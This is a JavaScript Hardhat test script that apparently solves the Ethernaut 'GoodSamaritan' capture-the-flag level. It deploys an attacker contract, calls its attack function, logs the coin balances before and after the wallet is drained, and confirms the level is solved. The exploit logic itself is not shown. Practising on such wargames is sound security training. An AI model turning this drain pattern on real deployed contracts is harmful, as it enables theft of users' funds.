const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx

before(async () => {
    ;[s1] = await ethers.getSigners()
    const challengeAddress = await createChallenge("0x36E92B2751F260D6a4749d7CA58247E7f8198284")
    challenge = await ethers.getContractAt("GoodSamaritan", challengeAddress)

    const attackerFactory = await ethers.getContractFactory("SamaritanAttacker")
    attacker = await attackerFactory.deploy(challenge.address)
})

it("solves the challenge", async function () {
    console.log("Samaritan address: ", challenge.address)
    const walletAddress = await challenge.wallet()
    const coinAddress = await challenge.coin()
    console.log("Wallet address: ", walletAddress)
    console.log("Coin address: ", coinAddress)

    const walletFactory = await ethers.getContractFactory("Wallet")
    const wallet = walletFactory.attach(walletAddress)
    console.log("Wallet owner: ", await wallet.owner())

    const coinFactory = await ethers.getContractFactory("Coin")
    const coin = coinFactory.attach(coinAddress)
    console.log("Wallet balance: ", await coin.balances(walletAddress))

    tx = await attacker.attack()
    await tx.wait()

    console.log("Attacker balance: ", await coin.balances(attacker.address))
    console.log("Wallet balance: ", await coin.balances(walletAddress))
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
